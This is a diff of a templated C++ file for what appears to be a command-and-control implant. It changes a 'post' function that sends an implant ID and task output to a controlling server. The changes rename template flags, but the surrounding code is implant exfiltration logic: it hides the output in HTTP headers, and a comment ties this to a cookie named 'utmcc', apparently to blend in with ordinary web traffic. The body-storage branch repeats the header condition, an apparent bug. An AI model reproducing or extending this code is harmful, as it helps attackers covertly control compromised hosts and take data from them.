@@ -18,25 +18,25 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     std::vector<std::wstring> headers;
 
     {# IF MC2 says it wants a header for storing the ID...#}
-    [% if id_http_header %]
-    headers.push_back(L"[[id_header]]: " + std::wstring(implant_uuid.begin(), implant_uuid.end()));
+    [% if server_id_http_header %]
+    headers.push_back(L"[[server_id_header]]: " + std::wstring(implant_uuid.begin(), implant_uuid.end()));
     [% endif %]
 
     {# IF MC2 says it wants a parameter for storing the ID...#}
-    [% if id_http_parameter %]
+    [% if server_id_http_parameter %]
     //?
     [% endif %]
 
 
     {# IF MC2 says it wants a header for storing the output...#}
-    [% if output_http_header %]
+    [% if server_output_http_header %]
     headers.push_back(L"[[output_header]]: " + std::wstring(payload.begin(), payload.end()));
     //this specific profile, no data in body. It's stored in utmcc
     std::string payload_string = "";
     [% endif %]
     
     {# IF MC2 says it wants to store the output in the body#}
-    [% if output_http_header %]
+    [% if server_output_http_header %]
     std::string payload_string = payload;
     [% endif %]
 
